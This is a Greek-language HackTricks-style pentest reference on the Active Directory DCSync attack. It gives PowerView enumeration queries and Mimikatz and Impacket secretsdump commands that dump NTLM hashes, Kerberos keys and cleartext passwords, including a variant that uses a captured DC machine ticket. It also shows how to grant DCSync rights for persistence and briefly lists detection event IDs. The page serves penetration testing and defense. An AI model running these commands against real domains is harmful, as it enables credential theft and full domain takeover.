# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Η άδεια **DCSync** συνεπάγεται την κατοχή των εξής δικαιωμάτων στο ίδιο το domain: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** και **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Σημαντικές σημειώσεις σχετικά με το DCSync:**

- Η **DCSync attack προσομοιώνει τη συμπεριφορά ενός Domain Controller και ζητά από άλλους Domain Controllers να κάνουν replicate πληροφορίες** χρησιμοποιώντας το Directory Replication Service Remote Protocol (MS-DRSR). Επειδή το MS-DRSR είναι έγκυρη και απαραίτητη λειτουργία του Active Directory, δεν μπορεί να απενεργοποιηθεί ή να καταργηθεί.
- Από προεπιλογή, μόνο οι ομάδες **Domain Admins, Enterprise Admins, Administrators και Domain Controllers** διαθέτουν τα απαιτούμενα privileges.
- Στην πράξη, το **full DCSync** απαιτεί τα **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** στο domain naming context. Το `DS-Replication-Get-Changes-In-Filtered-Set` συνήθως εκχωρείται μαζί με αυτά, αλλά από μόνο του είναι πιο σχετικό με τον συγχρονισμό **confidential / RODC-filtered attributes** (για παράδειγμα legacy LAPS-style secrets) παρά με ένα πλήρες krbtgt dump.<sup>[[2]](#references)</sup>
- Αν κάποιοι κωδικοί λογαριασμών αποθηκεύονται με reversible encryption, υπάρχει διαθέσιμη επιλογή στο Mimikatz για την επιστροφή του κωδικού σε clear text

### Enumeration

Ελέγξτε ποιος διαθέτει αυτά τα δικαιώματα χρησιμοποιώντας το `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Αν θέλετε να εστιάσετε σε **μη προεπιλεγμένους principals** με δικαιώματα DCSync, φιλτράρετε τις ενσωματωμένες ομάδες με δυνατότητα replication και εξετάστε μόνο μη αναμενόμενους trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Εκμετάλλευση τοπικά
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Εκμετάλλευση από απόσταση
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Πρακτικά παραδείγματα με περιορισμένο πεδίο:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync με captured TGT μηχανήματος DC (ccache)

Σε σενάρια `unconstrained-delegation export-mode`, μπορεί να καταγράψετε ένα TGT μηχανήματος Domain Controller (π.χ. `DC1$@DOMAIN` για `krbtgt@DOMAIN`). Στη συνέχεια, μπορείτε να χρησιμοποιήσετε αυτό το ccache για authentication ως το DC και να εκτελέσετε DCSync χωρίς password.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Σημειώσεις λειτουργίας:

- **Το Kerberos path του Impacket αγγίζει πρώτα το SMB** πριν από το DRSUAPI call. Αν το περιβάλλον επιβάλλει **SPN target name validation**, ένα πλήρες dump μπορεί να αποτύχει με το `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Σε αυτήν την περίπτωση, είτε ζητήστε πρώτα ένα **`cifs/<dc>`** service ticket για το target DC είτε χρησιμοποιήστε το **`-just-dc-user`** για τον λογαριασμό που χρειάζεστε άμεσα.
- Όταν έχετε μόνο χαμηλότερα δικαιώματα replication, το LDAP/DirSync-style syncing μπορεί και πάλι να αποκαλύψει **confidential** ή **RODC-filtered** attributes (για παράδειγμα το legacy `ms-Mcs-AdmPwd`) χωρίς πλήρες krbtgt replication.<sup>[[2]](#references)</sup>

Το `-just-dc` δημιουργεί 3 αρχεία:

- ένα με τα **NTLM hashes**
- ένα με τα **Kerberos keys**
- ένα με cleartext passwords από το NTDS για όλους τους λογαριασμούς στους οποίους έχει ενεργοποιηθεί η [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Μπορείτε να βρείτε τους χρήστες με reversible encryption με

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Αν είστε domain admin, μπορείτε να εκχωρήσετε αυτά τα δικαιώματα σε οποιονδήποτε χρήστη με τη βοήθεια του `powerview`:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Οι Linux operators μπορούν να κάνουν το ίδιο με το `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Στη συνέχεια, μπορείς να **ελέγξεις αν στον χρήστη εκχωρήθηκαν σωστά** τα 3 privileges, αναζητώντας τα στην έξοδο της εντολής (θα πρέπει να βλέπεις τα ονόματα των privileges μέσα στο πεδίο "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Πρέπει να είναι ενεργοποιημένο το Audit Policy για το object) – Εκτελέστηκε μια operation σε ένα object<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Πρέπει να είναι ενεργοποιημένο το Audit Policy για το object) – Τροποποιήθηκε ένα object της directory service
- Security Event ID 4670 (Πρέπει να είναι ενεργοποιημένο το Audit Policy για το object) – Άλλαξαν τα permissions σε ένα object
- AD ACL Scanner - Δημιουργία και σύγκριση reports των ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Αξιοποίηση των Replication Get-Changes και Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Dump των Password Hashes από Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
